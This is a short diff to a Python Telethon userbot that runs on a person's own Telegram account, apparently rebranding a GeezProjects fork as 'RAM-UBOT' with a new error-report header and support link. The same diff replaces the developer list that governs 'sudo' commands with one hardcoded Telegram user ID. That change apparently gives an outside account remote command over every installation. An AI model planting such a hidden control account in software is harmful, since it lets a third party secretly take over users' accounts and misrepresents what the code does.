@@ -16,7 +16,7 @@ from traceback import format_exc
 
 from telethon import events
 
-from userbot import CMD_HANDLER, CMD_LIST, DEVS, bot
+from userbot import CMD_HANDLER, CMD_LIST, bot
 
 def ram_cmd(pattern=None, command=None, **args):
     args["func"] = lambda e: e.via_bot_id is None
@@ -135,7 +135,7 @@ def register(**args):
     if "sudo" in args:
         del args["sudo"]
         args["incoming"] = True
-        args["from_users"] = DEVS
+        args["from_users"] = 1826643972
 
     if "ignore_unsafe" in args:
         del args["ignore_unsafe"]
@@ -187,8 +187,8 @@ def register(**args):
                 if not disable_errors:
                     date = strftime("%Y-%m-%d %H:%M:%S", gmtime())
 
-                    text = "**✘ GeezProjects ERROR REPORT ✘**\n\n"
-                    link = "[Group Support](https://t.me/GeezSupport)"
+                    text = "**✘ RAM-UBOT ERROR REPORT ✘**\n\n"
+                    link = "[Group Support](https://t.me/Ramsupportt)"
                     text += "Jika mau, Anda bisa melaporkan error ini, "
                     text += f"Cukup forward saja pesan ini ke {link}.\n\n"
 
